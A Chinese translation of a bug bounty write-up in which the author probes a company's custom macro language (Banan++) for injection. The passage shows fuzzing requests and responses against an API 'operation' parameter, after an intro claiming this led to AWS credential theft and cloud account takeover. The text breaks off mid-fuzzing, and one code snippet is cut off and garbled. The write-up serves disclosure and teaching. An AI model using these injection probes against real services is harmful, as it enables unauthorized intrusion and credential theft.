原文：
在本文中，我将为读者介绍自己在[Hackerone网站](https://hackerone.com/
"Hackerone网站")的一个私人漏洞赏金计划中发掘漏洞的故事。准确来说，这个漏洞的挖掘、利用和报告过程，正好花费了我12小时30分的时间，当然，中间没有休息，完全是一气呵成。利用这个漏洞，我能够转储AWS登陆凭证，从而获取了相关公司帐户的完全控制权限：我手中有20个桶和80个EC2实例（Amazon
Elastic Compute Cloud）。当然，在这个过程中，我也学到了很多，所以，专门撰写此文与诸君分享！
**简介**
* * *
如前所述，该漏洞是在一个私人项目中找到的，所以这里将相应公司暂且称之为：ArticMonkey。
为了自身业务以及其网络应用程序的需要，ArticMonkey公司开发了一种自定义的宏语言，我们称之为：Banan++。虽然我们不知道最初用于创建Banan++的语言到底是哪种，但是在考察其Web应用过程中，我们发现了一个JavaScript版本，所以，让我们不妨从它入手展开深入研究！
虽然原始的banan++.js文件已经进行了精简处理，但仍然有些臃肿，压缩后有2.1M，美化后有2.5M，包含56441行代码，共计2546981个字符。面对如此大的文件，我自然是不会直接阅读源码的……，相反，我是通过搜索Banan++特有的一些关键字，在第3348行中发现了第一个函数。后来，大约找到了大约135个函数，呵呵，这就是我们的狩猎对象。
**寻找猎物的踪迹**
* * *
之后，我开始从头开始阅读代码，当然，发现的大部分函数都是关于日期操作或数学操作的，没有发现什么真正让人感兴趣或危险的函数。经过一番折腾，我终于找到了一个看起来很有希望的函数，即`Union()`，其代码如下所示：
    helper.prototype.Union = function() {
       for (var _len22 = arguments.length, args = Array(_len22), _key22 = 0; _key22  2017 )"}
响应：
    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    Content-Length: 54
    Connection: close
    X-Content-Type-Options: nosniff
    X-Xss-Protection: 1
    Strict-Transport-Security: max-age=15768000; includeSubDomains
    ...REDACTED...
    [{"name":"REDACTED",...REDACTED...}]
参数operation貌似是一个不错的猎物，那就试一下吧！
**进行注入**
* * *
由于我对Banan++近乎一无所知，所以，我不得不进行一些相关的测试，以便弄清楚哪些类型的代码是可以注入的，哪些是不可以的。在某种程度上说，这有点像手动模糊测试。
    {...REDACTED...,"operation":"'\"><"}
    {"status":400,"message":"Parse error on line 1...REDACTED..."}
    {...REDACTED...,"operation":null}
    []
    {...REDACTED...,"operation":"0"}
    []
    {...REDACTED...,"operation":"1"}
    [{"name":"REDACTED",...REDACTED...}]
    {...REDACTED...,"operation":"a"}
    {"status":400,"message":"Parse error on line 1...REDACTED..."}
    {...REDACTED...,"operation":"a=1"}
    {"status":400,"message":"Parse error on line 1...REDACTED..."}
    {...REDACTED...,"operation":"alert"}
    {"status":400,"message":"Parse error on line 1...REDACTED..."}
    {...REDACTED...,"operation":"alert()"}
    {"status":400,"message":"Function 'alert' is not defined"}
    {...REDACTED...,"operation":"Union()"}
    []
这里得到的结论是：
  * 无法注入JavaScript代码
  * 可以注入Banan++函数
  * 响应内容似乎就像一个true/false标志，具体取决于对参数operation的解释是true还是false（这一点非常有用，因为可以验证注入的代码）
接下来，让我们再来鼓捣`Union()`：
    {...REDACTED...,"operation":"Union(1,2,3)"}
    {"status":400,"message":"Parse error on line 1...REDACTED..."}
    {...REDACTED...,"operation":"Union(a,b,c)"}
    {"status":400,"message":"Parse error on line 1...REDACTED..."}
    {...REDACTED...,"operation":"Union('a','b','c')"}
    {"status":400,"message":"Parse error on line 1...REDACTED..."}
    {...REDACTED...,"operation":"Union('a';'b';'c')"}
    [{"name":"REDACTED",...REDACTED...}]
    {...REDACTED...,"operation":"Union('1';'2';'3')"}
    [{"name":"REDACTED",...REDACTED...}]
    {...REDACTED...,"operation":"Union('1';'<';'3')"}